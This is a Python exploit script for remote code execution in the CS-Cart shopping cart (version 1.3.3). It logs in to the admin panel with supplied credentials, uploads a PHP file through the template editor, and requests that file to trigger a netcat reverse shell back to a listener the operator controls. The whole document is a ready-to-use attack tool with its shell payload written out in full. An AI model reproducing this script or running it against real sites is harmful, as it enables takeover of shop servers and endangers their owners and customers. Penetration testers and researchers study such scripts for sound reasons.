#!/usr/bin/python3

import requests, sys, signal, re, time, argparse

def def_handler(sig, frame):
    print("\n\n[!] Exiting...")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

def log_in(url, username, password, local_ip, local_port):
    s = requests.session()
    main_url = f"{url}/admin.php"
    upload_url = f"{url}/admin.php"
    directory_list = f"{url}/skins/"

    # Send GET request to retrieve the ACSID
    r = s.get(main_url)
    acsid = re.findall(r'name="acsid" value="(.*?)"', r.text)[0]

    # Sending login data
    post_data = {
        'target': 'auth',
        'mode': 'login',
        'acsid': acsid,
        'redirect_url': 'admin.php',
        'user_login': username,
        'password': password
    }

    r = s.post(main_url, data=post_data)

    if r.status_code == 200:
        print("[+] Login Successful")
    else:
        print("[!] Something went wrong, check your data")
        sys.exit(1)

    # Sending malicious payload to the vulnerable URL
    payload = ['pwned.phtml', f"<? system(\"nc -e /bin/bash {local_ip} {local_port}\");?>"]

    files = {
        'target': (None, 'template_editor'),
        'mode': (None, 'upload_file'),
        'm_utype[0]': (None, 'local'),
        'local_uploaded_data[0]': (payload[0], payload[1], 'application/octet-stream'),
        'server_uploaded_data[0]': (None, ' '),
        'url_uploaded_data[0]': (None, 'http://')
    }

    r = s.post(upload_url, files=files)

    if r.status_code == 200:
        print("[+] Payload uploaded successfully.")
        print(f"[+] Open up netcat to receive reverse shell on {local_ip}:{local_port}")
    time.sleep(2)

    r = s.get(directory_list + payload[0])

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="CS-Cart RCE Exploit v1.3.3")
    parser.add_argument('-U','--url', type=str, required=True, help="Remote host URL where CS-Cart is located")
    parser.add_argument('-u', '--username', type=str, required=True, help="CS-Cart Admin username")
    parser.add_argument('-p', '--password', type=str, required=True, help="CS-Cart Admin password")
    parser.add_argument('-L', '--ip' , type=str, required=True, help="Local IP address for reverseshell")
    parser.add_argument('-P', '--port', type=int, required=True, help="Local port to received reverseshell")

    args = parser.parse_args()

    log_in(args.url, args.username, args.password, args.ip, args.port)
